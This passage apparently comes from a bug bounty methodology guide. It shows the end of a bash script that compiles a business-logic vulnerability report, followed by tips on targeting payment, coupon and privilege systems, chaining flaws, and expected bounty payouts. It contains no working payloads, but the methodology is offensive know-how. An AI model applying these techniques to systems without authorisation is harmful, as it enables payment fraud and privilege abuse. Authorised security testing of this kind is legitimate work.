        total_flaws=$((total_flaws + race_flaws))
    fi
    
    echo "- **Total Business Logic Flaws:** $total_flaws" >> business_logic_assessment_report.md
    
    # Add detailed findings
    cat >> business_logic_assessment_report.md << 'EOF'

## 🔥 Critical Findings

### 1. E-commerce Logic Flaws
EOF
    
    if [[ -f logic_flaws_found.txt ]]; then
        echo '```' >> business_logic_assessment_report.md
        cat logic_flaws_found.txt >> business_logic_assessment_report.md
        echo '```' >> business_logic_assessment_report.md
    fi
    
    cat >> business_logic_assessment_report.md << 'EOF'

### 2. Authentication & Authorization Logic Flaws
EOF
    
    if [[ -f auth_logic_flaws.txt ]]; then
        echo '```' >> business_logic_assessment_report.md
        cat auth_logic_flaws.txt >> business_logic_assessment_report.md
        echo '```' >> business_logic_assessment_report.md
    fi
    
    cat >> business_logic_assessment_report.md << 'EOF'

### 3. Workflow Bypass Vulnerabilities
EOF
    
    if [[ -f workflow_bypass_flaws.txt ]]; then
        echo '```' >> business_logic_assessment_report.md
        cat workflow_bypass_flaws.txt >> business_logic_assessment_report.md
        echo '```' >> business_logic_assessment_report.md
    fi
    
    cat >> business_logic_assessment_report.md << 'EOF'

### 4. API Logic Flaws
EOF
    
    if [[ -f api_logic_flaws.txt ]]; then
        echo '```' >> business_logic_assessment_report.md
        cat api_logic_flaws.txt >> business_logic_assessment_report.md
        echo '```' >> business_logic_assessment_report.md
    fi
    
    cat >> business_logic_assessment_report.md << 'EOF'

## 🛠️ Remediation Recommendations

### Immediate Actions
1. **Input Validation**: Implement comprehensive server-side input validation
2. **Business Rule Enforcement**: Enforce all business rules on the server side
3. **Authorization Checks**: Implement proper authorization checks for all operations
4. **Transaction Integrity**: Use database transactions to maintain data consistency
5. **Rate Limiting**: Implement proper rate limiting for sensitive operations

### Long-term Improvements
1. **Security by Design**: Incorporate security considerations in business logic design
2. **Regular Testing**: Conduct regular business logic security testing
3. **Code Review**: Implement security-focused code review processes
4. **Monitoring**: Implement monitoring for unusual business logic patterns
5. **Training**: Train developers on business logic security best practices

## 📊 Impact Assessment

- **Critical**: Direct financial loss, complete business logic bypass
- **High**: Unauthorized access, privilege escalation, data manipulation
- **Medium**: Workflow bypass, minor business rule violations
- **Low**: Information disclosure, minor logic inconsistencies

## 🔗 References

- OWASP Business Logic Security Cheat Sheet
- OWASP Testing Guide - Business Logic Testing
- CWE-840: Business Logic Errors
- NIST Cybersecurity Framework
EOF
    
    echo "✅ Comprehensive report generated: business_logic_assessment_report.md"
}

generate_business_logic_report

echo "✅ Comprehensive Business Logic Analysis completed!"
echo "📁 Results saved in: $WORK_DIR"
echo "📄 Report available: business_logic_assessment_report.md"

# Final summary
echo ""
echo "📊 FINAL SUMMARY:"
echo "================="
echo "Application type: $app_type"
echo "Endpoints tested: $(wc -l < available_endpoints.txt 2>/dev/null || echo 0)"
echo "E-commerce flaws: $(wc -l < logic_flaws_found.txt 2>/dev/null || echo 0)"
echo "Auth logic flaws: $(wc -l < auth_logic_flaws.txt 2>/dev/null || echo 0)"
echo "Workflow bypasses: $(wc -l < workflow_bypass_flaws.txt 2>/dev/null || echo 0)"
echo "API logic flaws: $(wc -l < api_logic_flaws.txt 2>/dev/null || echo 0)"
echo "Race conditions: $(wc -l < business_logic_races.txt 2>/dev/null || echo 0)"

cd ..
```

## 💡 Pro Tips for Maximum Impact

### 1. **High-Value Business Logic Targets**
- Payment processing systems
- User privilege management
- Inventory/stock management
- Discount/coupon systems
- Multi-step workflows
- Financial transactions

### 2. **Common Business Logic Patterns to Test**
- Check-then-act operations
- Multi-step processes
- State transitions
- Resource allocation
- Time-based operations
- Rate limiting mechanisms

### 3. **Escalation Techniques**
- Chain multiple logic flaws
- Target high-value business operations
- Focus on financial impact
- Test edge cases and boundary conditions
- Combine with other vulnerability types

### 4. **Detection Strategies**
- Parameter manipulation testing
- Workflow step skipping
- State manipulation attempts
- Time-based logic testing
- Race condition exploitation

## 🎯 Expected Bounty Range: $500 - $2000+

**Medium Impact ($500-800):**
- Basic business logic bypasses
- Minor workflow skipping
- Non-financial logic flaws

**High Impact ($800-1200):**
- Payment process bypasses
- Privilege escalation via logic flaws
- Significant workflow bypasses

**Critical Impact ($1200-2000+):**
- Complete payment bypass
- Financial transaction manipulation
- Critical business process compromise
- Mass privilege escalation

## ⚠️ Legal Disclaimer
This methodology is for authorized security testing only. Business logic testing can affect real business operations and financial transactions. Always ensure you have proper permission and test in controlled environments with test data only.

---
**Created by Elite Bug Bounty Hunter | Follow responsible disclosure practices**
